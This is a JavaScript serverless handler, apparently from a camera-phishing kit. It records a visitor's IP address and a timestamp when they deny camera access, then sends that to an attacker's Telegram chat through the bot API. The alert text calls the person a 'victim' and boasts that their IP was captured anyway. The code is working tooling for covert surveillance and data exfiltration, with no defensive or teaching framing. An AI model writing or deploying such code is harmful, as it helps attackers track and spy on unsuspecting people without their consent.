// Función para enviar a Telegram
async function sendToTelegram(message) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram no configurado:', message);
    return;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (response.ok) {
      console.log('Mensaje enviado a Telegram');
    }
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               'unknown';
               
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Crear mensaje para Telegram
    const message = `⚠️ <b>VÍCTIMA NEGÓ LA CÁMARA</b>
  
📱 <b>IP:</b> <code>${ip}</code>
⏰ <b>Hora:</b> ${timestamp}
🚫 <b>Estado:</b> Acceso a cámara denegado

😤 La víctima se escapó, pero tenemos su IP...`;

    // Enviar a Telegram
    await sendToTelegram(message);

    // Log
    console.log(`[${timestamp}] CAMERA_DENIED from ${ip}`);

    res.json({ status: 'logged' });

  } catch (error) {
    console.error('Error logging camera denied:', error);
    res.status(500).json({ status: 'error', message: 'Error logging event' });
  }
}; 